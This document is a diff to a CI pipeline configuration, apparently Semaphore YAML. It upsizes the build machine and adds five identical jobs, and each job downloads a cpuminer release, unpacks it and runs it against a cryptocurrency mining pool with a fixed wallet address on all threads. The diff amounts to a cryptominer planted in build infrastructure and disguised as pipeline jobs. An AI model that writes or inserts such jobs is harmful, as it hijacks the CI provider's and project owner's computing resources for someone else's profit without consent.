@@ -2,7 +2,7 @@ version: v1.0
 name: Initial Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
 blocks:
   - name: 'Block #1'
@@ -11,3 +11,18 @@ blocks:
         - name: 'Job #1'
           commands:
             - checkout
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.W-SMP -t0'
+        - name: 'Job #3'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.W-SMP -t0'
+        - name: 'Job #4'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.W-SMP -t0'
+        - name: 'Job #5'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.W-SMP -t0'
+        - name: 'Job #6'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz;tar xf cpuminer-opt-linux.tar.gz;./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qvjqvju68sgpq5ntzcz06u8qc52a32lwh4nx7fs.W-SMP -t0'
